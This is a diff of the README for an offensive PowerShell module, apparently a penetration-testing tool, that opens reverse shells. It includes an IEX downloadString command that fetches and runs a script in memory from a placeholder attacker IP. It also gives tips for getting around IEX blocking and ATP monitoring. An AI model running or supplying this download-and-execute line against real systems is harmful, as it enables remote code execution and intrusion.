@@ -1,8 +1,9 @@
 # ReversePowerShell
-#
-NOW IN POWERSHELL GALLERY
+###NOW IN POWERSHELL GALLERY!!!
+```powershell
 Install-Module ReversePowerShell
-#
+```
+---
 #
 Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
 to connect to Start-Listener as well as netcat and metasploit modules however it can not connect to Start-Bind.
@@ -29,8 +30,10 @@ Import-Module .\ReversePowerShell.psm1
 
 If your are able to use Invoke-Expresion (IEX) this module can be imported using the following command.
 You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
+Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into 
+memory in order to run the cmdlets.
 ```powershell
-IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.psm1")
+IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
 ```
 
 IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a targerts machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
